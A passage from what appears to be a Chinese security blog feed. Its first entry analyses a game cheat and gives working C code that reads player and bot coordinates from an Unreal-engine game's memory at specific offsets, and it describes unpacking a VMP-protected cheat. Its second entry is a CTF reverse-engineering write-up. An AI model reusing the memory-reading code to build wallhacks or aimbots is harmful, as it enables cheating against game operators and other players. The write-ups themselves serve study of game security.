class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LocalPlayer: 0x%llx\n&quot;</span>, LocalPlayer);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PlayerController: 0x%llx\n&quot;</span>, PlayerController);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PlayerActor: 0x%llx\n&quot;</span>, PlayerActor);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)UWorld + <span class="hljs-number">0x30</span>), (LPVOID)&amp;ULevel, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)ULevel + <span class="hljs-number">0xA0</span>), (LPVOID)&amp;ActorCount, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)ULevel + <span class="hljs-number">0x98</span>), (LPVOID)&amp;ActorArray, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 读取玩家坐标</span><br>    FLOAT posi[<span class="hljs-number">3</span>];<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PlayerActor + <span class="hljs-number">0x3A0</span>), (LPVOID)&amp;PlayerPosition, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PlayerPosition+<span class="hljs-number">0x1A0</span>), (LPVOID)posi, <span class="hljs-number">0xC</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;posi: [%f, %f, %f]\n&quot;</span>, posi[<span class="hljs-number">0</span>], posi[<span class="hljs-number">1</span>], posi[<span class="hljs-number">2</span>]);<br>    <span class="hljs-comment">// 读取玩家视角</span><br>    FLOAT persp_x, persp_y;<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PlayerPosition + <span class="hljs-number">0x154</span>), (LPVOID)&amp;persp_x, <span class="hljs-number">0x4</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PlayerPosition + <span class="hljs-number">0x174</span>), (LPVOID)&amp;persp_y, <span class="hljs-number">0x4</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;perspective: [%f, %f]\n&quot;</span>, persp_x, persp_y);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ULevel: 0x%llx\n&quot;</span>, ULevel);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ActorCount: %d\n&quot;</span>, ActorCount);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ActorArray: 0x%llx\n&quot;</span>, ActorArray);<br>    <span class="hljs-comment">// 读取GName</span><br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)baseAddr + <span class="hljs-number">0x2E6E0C0</span>), (LPVOID)&amp;GName, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;GName: 0x%llx\n&quot;</span>, GName);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-comment">// 遍历ActorArry</span><br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; ActorCount; i++)<br>    &#123;<br>        LPVOID AActor;<br>        DWORD id;<br>        LPVOID PNameArray;<br>        LPVOID PName;<br>        CHAR name[<span class="hljs-number">0x100</span>];<br>        ReadProcessMemory(hProcess, (LPVOID)((BYTE*)ActorArray + i * <span class="hljs-number">8</span>), (LPVOID)&amp;AActor, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (ReadProcessMemory(hProcess, (LPVOID)((BYTE*)AActor + <span class="hljs-number">0x18</span>), (LPVOID)&amp;id, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>))<br>        &#123;<br>            ReadProcessMemory(hProcess, (LPVOID)((BYTE*)GName + (id / <span class="hljs-number">0x4000</span>) * <span class="hljs-number">8</span>), (LPVOID)&amp;PNameArray, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>            ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PNameArray + (id % <span class="hljs-number">0x4000</span>) * <span class="hljs-number">8</span>), (LPVOID)&amp;PName, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (ReadProcessMemory(hProcess, (LPVOID)((BYTE*)PName + <span class="hljs-number">0xC</span>), (LPVOID)name, <span class="hljs-number">0x100</span>, <span class="hljs-literal">NULL</span>))<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: %s\n&quot;</span>, i, name);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="assets/2023-11-12-21-35-26-image.png"></p><p><img src="assets/2023-11-12-21-35-53-image.png"></p><p>玩家的坐标、视角都已经找到了，并且Actor对象的name识别也成功了，猜测<code>BotPawn_C</code>为机器人玩家的Actor对象，猜测其坐标算法与玩家相同，CE结构体分析</p><p><img src="assets/2023-11-12-21-39-37-image.png"></p><p><img src="assets/2023-11-12-21-40-18-image.png"></p><p><img src="assets/2023-11-12-21-40-50-image.png"></p><p>发现按照<code>Actor-&gt;0x3A0-&gt;0x1A0</code>的偏移确实可以找到机器人坐标</p><p>机器人玩家坐标计算如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">posi_x = [[AActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x1A0</span>]<br>posi_y = [[AActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x1A4</span>]<br>posi_z = [[AActor+<span class="hljs-number">0x3A0</span>]+<span class="hljs-number">0x1A8</span>]<br></code></pre></td></tr></table></figure><p>修改以下代码可以获取所有机器人玩家坐标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// printf(&quot;%d: %s\n&quot;, i, name);</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;BotPawn_C&quot;</span>))<br>&#123;<br>    LPVOID botPosition;<br>    FLOAT botPosi[<span class="hljs-number">3</span>];<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)AActor + <span class="hljs-number">0x3A0</span>), (LPVOID)&amp;botPosition, <span class="hljs-number">8</span>, <span class="hljs-literal">NULL</span>);<br>    ReadProcessMemory(hProcess, (LPVOID)((BYTE*)botPosition + <span class="hljs-number">0x1A0</span>), (LPVOID)botPosi, <span class="hljs-number">0xC</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bot: [%f, %f, %f] \n&quot;</span>, botPosi[<span class="hljs-number">0</span>], botPosi[<span class="hljs-number">1</span>], botPosi[<span class="hljs-number">2</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="assets/2023-11-12-21-47-33-image.png"></p><p>至此，已实现获取玩家坐标、玩家视角、敌人坐标的目标，对坐标数据进行数学处理，使用GUI工具绘制到屏幕上，即可实现透视效果，同样可以通过计算玩家视角需要转动的角度，实现自瞄的功能。</p><h3 id="外挂分析"><a href="#外挂分析" class="headerlink" title="外挂分析"></a>外挂分析</h3><h5 id="VMP脱壳DUMP"><a href="#VMP脱壳DUMP" class="headerlink" title="VMP脱壳DUMP"></a>VMP脱壳DUMP</h5><p><img src="assets/2023-11-12-21-54-21-image.png"></p><p>入口push call，典型vmp，使用API断点回溯确定程序逻辑是否加密</p><p>根据外挂实现原理，读取进程需要使用<code>ReadProcessMemory</code>API，而这之前还需要使用<code>OpenProcess</code>API打开进程，<code>OpenProcess</code>需要的参数为进程PID，但是该外挂程序不需要提供PID，因此该外挂运行早期会使用某些方式获取目标游戏的PID，需要利用<code>Thelp32</code>功能，对<code>CreateThelp32Snapshot</code>下断点</p><p><img src="assets/2023-11-12-22-00-29-image.png"></p><p>ScyllaHide过VMP反调试</p><p><img src="assets/2023-11-12-22-01-03-image.png"></p><p>3处nop断下后F9运行</p><p><img src="assets/2023-11-12-22-02-08-image.png"></p><p>Thelp32断下，第一次是VMP反调试调用的，忽略掉，F9运行</p><p><img src="assets/2023-11-12-22-02-51-image.png"></p><p>Thelp32第二次断下，分析调用栈回溯</p><p><img src="assets/2023-11-12-22-18-27-image.png"></p><p>发现此处为典型的msvc编译器主函数调用入口</p><p><img src="assets/2023-11-12-22-19-12-image.png"></p><p>因此该层为<code>start</code>，可以确定程序逻辑未加密，向上找到程序入口点<code>OEP</code></p><p><img src="assets/2023-11-12-22-19-42-image.png"></p><p>对OEP下断点，取消Thelp32断点，重新运行程序，3次nop之后OEP断下</p><p><img src="assets/2023-11-12-22-20-50-image.png"></p><p>使用Scylla插件DUMP外挂内存</p><p><img src="assets/2023-11-12-22-23-19-image.png"></p><p>使用Fix Dump修复DUMP文件的导入数据</p><p><img src="assets/2023-11-12-22-24-07-image.png"></p><p>删除带X的FThunk</p><p>运行恢复后的DUMP文件<code>hack_dump_SCY.exe</code>，外挂功能正常</p><p><img src="assets/2023-11-12-22-29-08-image.png"></p><p>外挂脱壳完成</p><h5 id="外挂逻辑分析"><a href="#外挂逻辑分析" class="headerlink" title="外挂逻辑分析"></a>外挂逻辑分析</h5><p>使用IDA Pro打开脱壳后的<code>hack_dump_SYC.exe</code>分析逻辑，动态调试之后对主函数注释如下，程序中的字符串大部分被加密，算法比较简单，但是使用动态调试也可以直接得到解密之后的字符串</p><p><img src="assets/2023-11-12-22-31-52-image.png"></p><p>主要功能就是打开游戏进程，获取游戏加载地址，创建窗口等操作，API断点回溯时断下的位置在<code>GetPidByName</code>函数中</p><p><img src="assets/2023-11-12-22-33-30-image.png"></p><p>作弊的主要逻辑在<code>CheatProc</code>过程函数中</p><p><img src="assets/2023-11-12-22-34-29-image.png"></p><p><code>showGUI</code>函数调用<code>imGUI</code>库在屏幕上显示窗口</p><p><img src="assets/2023-11-12-22-35-51-image.png"></p><p>这里使用<code>GetAsyncKeyState</code>API判断HOME键是否被按下，HOME按下之后切换GUI显示状态</p><p><img src="assets/2023-11-12-22-38-55-image.png"></p><p><code>CheatMain</code>里第一个和最后一个函数是用来刷新屏幕上显示的文本标签的，可以直接忽略</p><p>继续进入到<code>cheatMain</code>函数，这里是主要的外观逻辑实现</p><p><img src="assets/2023-11-12-22-40-45-image.png"></p><p><img src="assets/2023-11-12-22-40-59-image.png"></p><p>首先使用<code>ReadProcessMemory</code>API读取进程内存，获取<code>UWorld</code>，<code>GName</code>等数据，偏移的计算在游戏分析部分得到的偏移基本相同，对所有的全局变量进行注释，方便后续分析</p><p><img src="assets/2023-11-12-22-43-32-image.png"></p><p><img src="assets/2023-11-12-22-44-46-image.png"></p><p><img src="assets/2023-11-12-22-44-35-image.png"></p><p>遍历游戏中所有的Actor对象，并且获取对象的name，与<code>BotPawn_C</code>进行比较，判断该AActor是否为机器人</p><p><img src="assets/2023-11-12-22-46-13-image.png"></p><p>是机器人时读取机器人坐标，根据玩家坐标、窗口分辨率计算是否在屏幕显示范围内，是的话则会在屏幕上显示玩家与机器人的距离</p><p>此部分还计算了机器人在屏幕上显示坐标与窗口中心的距离，循环结束后保持与屏幕中心距离最近的机器人坐标，用于自瞄功能</p><p><img src="assets/2023-11-12-22-49-57-image.png"></p><p>自瞄功能同样使用<code>GetAsyncKeyState</code>判断按键是否按下，这里判断的是鼠标右键，当鼠标右键按下时，修改玩家视角使其瞄向距离屏幕中心最近的机器人</p><p>至此，外挂程序功能分析完成。</p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>拟态2023-RE</title>
    <link href="/2023/11/12/ctf_wp/%E6%8B%9F%E6%80%812023-RE/"/>
    <url>/2023/11/12/ctf_wp/%E6%8B%9F%E6%80%812023-RE/</url>
    
    <content type="html"><![CDATA[<h3 id="fisher"><a href="#fisher" class="headerlink" title="fisher"></a>fisher</h3><p>各种反调试检测</p><ul><li><p>vmtoolsd.exe</p><p><img src="assets/2023-11-12-10-29-04-image.png"></p></li><li><p>NtQueryInformationProcess</p><p><img src="assets/2023-11-12-10-29-42-image.png"></p><p><img src="assets/2023-11-12-10-31-19-image.png"></p></li><li><p>花指令</p><p><img src="assets/2023-11-12-10-39-27-image.png"></p><p><img src="assets/2023-11-12-10-39-46-image.png"></p><p><img src="assets/2023-11-12-10-32-36-image.png"></p></li><li><p>随机数干扰</p><p><img src="assets/2023-11-12-10-41-08-image.png"></p></li></ul><p>把反调试全部patch掉</p><p>很多的函数里对输入数据都做sha1校验，输入数据的sha1校验结果需要为<code>2e95a5c5f9643df668d3965a6cdf19541bc0496b</code></p><p><img src="assets/2023-11-12-10-40-28-image.png"></p><p>看了好久没找到sha1突破点</p><p>一开始只看了反编译c代码，被错误的输出干扰了</p><p><img src="assets/2023-11-12-10-33-35-image.png"></p><p>需要注意try catch</p><p><img src="assets/2023-11-12-10-34-09-image.png"></p><p><img src="assets/2023-11-12-10-35-08-image.png"></p><p>try里面做了sha1校验，当校验通过时会抛出异常，进入到catch块，校验不通过返回0</p><p>突破点在catch块内，看catch块的末尾可以找到输出字符串的部分</p><p><img src="assets/2023-11-12-10-45-08-image.png"></p><p>左边是正确时的输出，字符串解密之后是<code>you win! your flag: flag&#123;your input&#125;</code></p><p>核心的加密运算在<code>call [rax+0x18]</code>，加密完跟<code>N17EHf1DWHD40DWH/f79E05EfIH1E179E1</code>字符串比较</p><p><img src="assets/2023-11-12-10-47-19-image.png"></p><p>函数里面第一个大循环把输入拷贝了一遍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c">v20 = (BYTE *)Src[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> ( v4 != v3 )<br>&#123;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v21 = &amp;v3[(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v18];<br>    <span class="hljs-keyword">if</span> ( v20 == v48 )<br>    &#123;<br>      sub_7FF6786A9B10((<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)Src, v20, v21);<br>      v22 = (BYTE *)Src[<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      *v20 = *v21;<br>      v22 = (BYTE *)++Src[<span class="hljs-number">1</span>];<br>    &#125;<br>    v18 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v18 + <span class="hljs-number">1</span>);<br>    a1 = v49;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v18 == *((_QWORD *)&amp;v49 + <span class="hljs-number">1</span>) - (_QWORD)v49 )<br>      <span class="hljs-keyword">break</span>;<br>    v23 = *(_BYTE *)(v49 + v18);<br>    <span class="hljs-keyword">if</span> ( v23 == *((_BYTE *)Src[<span class="hljs-number">0</span>] + v19) )    <span class="hljs-comment">// 后一个字符与前一个字符相同，填充X</span><br>    &#123;<br>      v41[<span class="hljs-number">0</span>] = <span class="hljs-number">88</span>;<br>      <span class="hljs-keyword">if</span> ( v22 == v48 )<br>      &#123;<br>        sub_7FF6786A9B10((<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)Src, v22, v41);<br>        v20 = (BYTE *)Src[<span class="hljs-number">1</span>];<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        *v22 = <span class="hljs-number">88</span>;<br>        v20 = (BYTE *)++Src[<span class="hljs-number">1</span>];<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v22 == v48 )<br>      &#123;<br>        sub_7FF6786A9B10((<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)Src, v22, (_BYTE *)(v49 + v18));<br>        v20 = (BYTE *)Src[<span class="hljs-number">1</span>];<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        *v22 = v23;<br>        v20 = (BYTE *)++Src[<span class="hljs-number">1</span>];<br>      &#125;<br>      LODWORD(v18) = v18 + <span class="hljs-number">1</span>;<br>    &#125;<br>    v19 += <span class="hljs-number">2</span>;<br>    v3 = (BYTE *)v49;<br>    a1 = *((_QWORD *)&amp;v49 + <span class="hljs-number">1</span>) - v49;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v18 &gt;= *((_QWORD *)&amp;v49 + <span class="hljs-number">1</span>) - (_QWORD)v49 )<br>      <span class="hljs-keyword">goto</span> LABEL_42;<br>  &#125;<br>  v41[<span class="hljs-number">0</span>] = <span class="hljs-number">88</span>;<br>  <span class="hljs-keyword">if</span> ( v22 == v48 )                           <span class="hljs-comment">// 长度为奇数，末尾补X</span><br>  &#123;<br>    sub_7FF6786A9B10((<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)Src, v22, v41);<br>    v20 = (BYTE *)Src[<span class="hljs-number">1</span>];<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *v22 = <span class="hljs-number">88</span>;<br>    v20 = (BYTE *)++Src[<span class="hljs-number">1</span>];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二个大循环对输入字符串做了一些处理，按两个字符一组，忽略字符表以外的字符，第一个字符和第二字符相同时在中间加<code>X</code>，字符串长度为奇数末尾加<code>X</code></p><p>字符表<code>ghijklpqrstuvwxyzABCabcDEFdef0123GHI4567JKL+/MNOmnoPQRSXYZ8TUVW9</code></p><p>接下来核心加密部分</p><p><img src="assets/2023-11-12-10-51-07-image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">do</span><br>    &#123;<br>      v10 = *((_BYTE *)*a2 + v6);<br>      sub_7FF6786AA6D3(<span class="hljs-number">2</span>i64, (__int64)a2);<br>      v11 = <span class="hljs-number">0</span>;<br>      v12 = <span class="hljs-number">0</span>i64;<br>      v13 = a1 + <span class="hljs-number">9</span>;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>      &#123;<br>        v14 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>i64; i &lt; <span class="hljs-number">8</span>; ++i )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( v10 == *((_BYTE *)v13 + i) )<br>          &#123;<br>            i1 = v11;<br>            i_ = v12;<br>            j1 = v14;<br>            <span class="hljs-keyword">goto</span> LABEL_10;<br>          &#125;<br>          ++v14;<br>        &#125;<br>        ++v11;<br>        ++v12;<br>        ++v13;<br>        <span class="hljs-keyword">if</span> ( v12 &lt; <span class="hljs-number">8</span> )<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>LABEL_10:<br>      v16 = v6 + <span class="hljs-number">1</span>;<br>      v17 = *((_BYTE *)*a2 + v16);<br>      sub_7FF6786AA6D3(<span class="hljs-number">2</span>i64, (__int64)v13);<br>      v18 = <span class="hljs-number">0</span>;<br>      v19 = <span class="hljs-number">0</span>i64;<br>      v20 = a1 + <span class="hljs-number">9</span>;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>      &#123;<br>        v21 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>i64; j &lt; <span class="hljs-number">8</span>; ++j )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( v17 == *((_BYTE *)v20 + j) )<br>          &#123;<br>            i2 = v18;<br>            j2 = v21;<br>            <span class="hljs-keyword">goto</span> LABEL_17;<br>          &#125;<br>          ++v21;<br>        &#125;<br>        ++v18;<br>        ++v19;<br>        ++v20;<br>        <span class="hljs-keyword">if</span> ( v19 &lt; <span class="hljs-number">8</span> )<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>LABEL_17:<br>      <span class="hljs-keyword">if</span> ( i1 == i2 )<br>      &#123;<br>        v23 = <span class="hljs-number">8</span> * i_ + <span class="hljs-number">72</span>;<br>        v24 = (<span class="hljs-type">char</span> *)a1 + v23 + (<span class="hljs-type">int</span>)(j1 + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>;<br>        v25 = *(_BYTE **)(a3 + <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> ( v25 == *(_BYTE **)(a3 + <span class="hljs-number">16</span>) )<br>        &#123;<br>          sub_7FF6786A9B10((<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)a3, v25, v24);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          *v25 = *v24;<br>          ++*(_QWORD *)(a3 + <span class="hljs-number">8</span>);<br>        &#125;<br>        sub_7FF6786AA6D3(<span class="hljs-number">2</span>i64, (__int64)v25);<br>        v26 = (<span class="hljs-type">char</span> *)a1 + v23 + (j2 + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>;<br>        a2 = *(<span class="hljs-type">void</span> ***)(a3 + <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> ( a2 == *(<span class="hljs-type">void</span> ***)(a3 + <span class="hljs-number">16</span>) )<br>        &#123;<br>          sub_7FF6786A9B10((<span class="hljs-type">const</span> <span class="hljs-type">void</span> **)a3, a2, v26);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          *(_BYTE *)a2 = *v26;<br>          ++*(_QWORD *)(a3 + <span class="hljs-number">8</span>);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v27 = *a1;<br>        <span class="hljs-keyword">if</span> ( j1 == j2 )<br>          (*(<span class="hljs-type">void</span> (__fastcall **)(__int64 *, _QWORD, __int64, _QWORD, <span class="hljs-type">int</span>))v27)(a1, j1, a3, i1, i2);<br>        <span class="hljs-keyword">else</span><br>          (*(<span class="hljs-type">void</span> (__fastcall **)(__int64 *, _QWORD, _QWORD, __int64, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>))(v27 + <span class="hljs-number">8</span>))(a1, i1, j1, a3, i2, j2);<br>      &#125;<br>      v6 = v16 + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v6 &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)len );<br></code></pre></td></tr></table></figure><p>在while循环里，两个字符一组，查字符表索引，每个字符对应两个索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">index = <span class="hljs-number">8</span> * i + j<br></code></pre></td></tr></table></figure><p>用python还原一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">table = <span class="hljs-string">&quot;ghijklpqrstuvwxyzABCabcDEFdef0123GHI4567JKL+/MNOmnoPQRSXYZ8TUVW9&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">c1, c2</span>):<br>    i1 = table.index(c1) // <span class="hljs-number">8</span><br>    j1 = table.index(c1) % <span class="hljs-number">8</span><br>    i2 = table.index(c2) // <span class="hljs-number">8</span><br>    j2 = table.index(c2) % <span class="hljs-number">8</span><br>    <span class="hljs-keyword">if</span> (i1 == i2):<br>        indx1 = <span class="hljs-number">8</span> * i1 + (j1 + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span><br>        indx2 = <span class="hljs-number">8</span> * i2 + (j2 + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> (j1 == j2):<br>            indx1 = <span class="hljs-number">8</span> * ((i1 + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>) + j1<br>            indx2 = <span class="hljs-number">8</span> * ((i2 + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>) + j2<br>        <span class="hljs-keyword">else</span>:<br>            indx1 = <span class="hljs-number">8</span> * i1 + j2<br>            indx2 = <span class="hljs-number">8</span> * i2 + j1<br>    <span class="hljs-keyword">return</span> table[indx1]+table[indx2]<br><br></code></pre></td></tr></table></figure><p>要根据两个字符的ij情况分类做替换，写出逆过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 